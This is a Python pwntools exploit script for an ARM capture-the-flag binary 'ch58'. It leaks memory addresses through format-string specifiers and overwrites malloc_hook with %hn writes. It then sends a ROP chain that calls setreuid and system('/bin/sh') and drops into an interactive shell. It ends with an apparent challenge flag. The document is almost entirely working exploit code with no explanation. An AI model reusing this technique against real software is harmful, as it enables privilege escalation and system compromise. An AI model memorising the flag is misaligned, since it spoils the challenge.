#!/usr/bin/python


# file ch58
# set architecture arm
# target remote 127.0.0.1:1234

# qemu-arm -L /usr/arm-linux-gnueabi/ -g 1234 ./ch58


from pwn import *
import binascii
import time
import sys



def mod65536(a, b):
    return ((a-b)+0x10000)%0x10000

def craft_payload(t, prev=0):
    res = ""
    for i in t:
        res += "%"+str(mod65536(i[0], prev))+"u%"+str(i[1])+"$hn"
        prev = i[0]
    return (res, prev)

def send_recv(payload, r):
    r.sendline(payload+';;;;;;;')
    tmp = r.recvuntil(';;;;;;;', timeout=0.2)
    if tmp != '':
        ret = tmp.split(';;;;;;;')[0]
    else:
        ret = ""
    while tmp != '':
        tmp = r.recvuntil(';;;;;;;', timeout=0.05)
        if tmp != '':
            ret = tmp.split(';;;;;;;')[0]
    return ret

def init_write_addr(leak_env, r, text=False):
    high = leak_env >> 16
    offset = (leak_env & 0xffff) + 0x80
    if not text:
        send_recv("%"+str(offset)+"u%94$hn", r)
        send_recv("%"+str(offset+8)+"u%95$hn", r)
        offset += 2
        send_recv("%"+str(offset)+"u%94$hn", r)
        send_recv("%"+str(high)+"u%95$hn", r)
        offset += 2
        send_recv("%"+str(offset)+"u%94$hn", r)
        send_recv("%"+str(offset+6)+"u%95$hn", r)
        offset += 2
        send_recv("%"+str(offset)+"u%94$hn", r)
        send_recv("%"+str(high)+"u%95$hn", r)
    else:
        res = ""
        t = [(offset,94), (offset+8,95), (offset+2,94), (high,95), (offset+6,94), (high,95), (offset+4,94), (offset+10,95)]
        for i in t:
            res += craft_payload([i])[0]+"\n"
        return res

def write_addr(addr, r, text=False, prev=0):
    low = addr & 0xffff
    high = addr >> 16
    if not text:
        send_recv("%"+str(low)+"u%111$hn", r)
        send_recv("%"+str(high)+"u%112$hn", r)
    else:
        t = [(low,111+16), (high,112+16)]
        return craft_payload(t)

def write_addr_one_liner(addr, env_leaked, N, r):
    offset = env_leaked+0x8c
    res = ""
    for i in range(2*N):
        res += write_addr(offset+2*i, r, True)[0]+"\n"
        cur = addr+i
        if i%2 == 0:
            cur = cur & 0xffff
        else:
            cur = cur >> 16
        res += craft_payload([(cur,113+16)])[0]+'\n'
    return res

def write_multiple_one_liner(addr, env_leaked, to_write, r):
    res = write_addr_one_liner(addr, env_leaked, 2*len(to_write), r)
    t = []
    for i in range(2*len(to_write)):
        if i%2 == 0:
            cur = to_write[i//2] & 0xffff
        else:
            cur = to_write[i//2] >> 16
        t.append((cur, 114+i+16))
    return res+craft_payload(t)[0]


if len(sys.argv) > 1:
    emulate = True
else:
    emulate = False


if emulate:
    r = process(['qemu-arm',  '-L', '/usr/arm-linux-gnueabi/', '-g', '1234', 'ch58'])
else:
    r = process(['./ch58'])

r.recvuntil('server')
r.sendline("%4$p %7$p %9$p %94$p ;;;")
leaked = r.recvuntil(';;;').split(' ')

bss = int(leaked[0], 16)
stack = int(leaked[1], 16)
libc = int(leaked[2], 16)
env = int(leaked[3], 16)

setreuid = libc+0x77712
system = libc+0x15ed6
printf = system+0xa834
execv = libc+0x59862
exit = libc+0xf94e
#pop_all_ret = libc+0x4e361
pop_r0_r4_pc = libc+0x40191
ldm_r0_to_pc = libc+0x8f571
# 0x0002e758 : pop {r0, r1, r2, ip, sp, pc}
pop_r0_r1_r2_ip_sp_pc = libc+0x17ead
# 0x00091b34 : pop {r0, r1, ip, pc}
pop_r0_r1_pc = libc+0x17ead+0x00091b34-0x0002e758
# 0x000b0328 : pop {r0, r1, r3, r5, r7, pc}
pop_r0_r1_r3_r5_r7_pc = libc+0x17ead+0x000b0328-0x0002e758
# 0x0009cf80 : svc #0xe0f778 ; andhs fp, r1, sp, ror #18 ; pop {r0, r2, ip, sp, pc}
svc = libc+0x17ead+0x0009cf80-0x0002e758
stdin_hook = libc+0xd13a1
free_hook = libc+0xd2e5d
malloc_hook = free_hook-0xb10

script_address = bss

print(init_write_addr(env, None, True))
for i in init_write_addr(env, None, True).split('\n'):
    print(i)
    print(send_recv(i, r))

print(write_multiple_one_liner(malloc_hook, env, [ldm_r0_to_pc], None))
for i in write_multiple_one_liner(malloc_hook, env, [ldm_r0_to_pc], None).split('\n'):
    print(send_recv(i, r))

print(write_multiple_one_liner(bss-0x1000, env, [0x6e69622f, 0x68732f, 0, bss-0x1000, 0], None))
for i in write_multiple_one_liner(env+0x100, env, [0x6e69622f, 0x68732f, 0], None).split('\n'):
    print(send_recv(i, r))

for i in write_multiple_one_liner(env+0x10c, env, [env+0x100, 0, 0], None).split('\n'):
    print(send_recv(i, r))

addr_to_test = bss-0x11744+0xc
offset = 0x120
payload = "%"+str(script_address-0x20)+"u"
payload += "A"*(len("AAAA"*6)-len(payload))
payload += p32(bss+0x60)
payload += p32(bss+0x28)
payload += p32(pop_r0_r1_pc)
payload += p32(pop_r0_r1_pc)
payload += p32(1258)
payload += p32(1258)
payload += p32(0)
payload += p32(setreuid)
payload += p32(env+0x100)
payload += p32(0)
payload += p32(0)
payload += p32(system)

print(payload)
print(send_recv(payload, r))
print(hex(env+0x100))

r.interactive()

#HeapFormatStringBugIsStillExploitable
